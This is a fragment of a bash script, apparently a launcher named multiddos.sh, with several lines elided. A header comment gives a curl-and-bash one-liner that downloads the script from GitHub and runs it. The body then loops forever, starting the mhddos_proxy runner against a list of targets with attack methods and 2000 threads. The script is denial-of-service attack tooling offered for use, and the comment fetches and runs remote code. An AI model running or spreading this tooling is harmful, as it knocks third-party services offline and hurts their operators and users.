#!/bin/bash
# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/multiddos.sh && bash multiddos.sh && tmux a
...
while true; do
    ...
    if [[ $lite == "on" ]]; then
        ...
        python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods -t 2000 &
    else
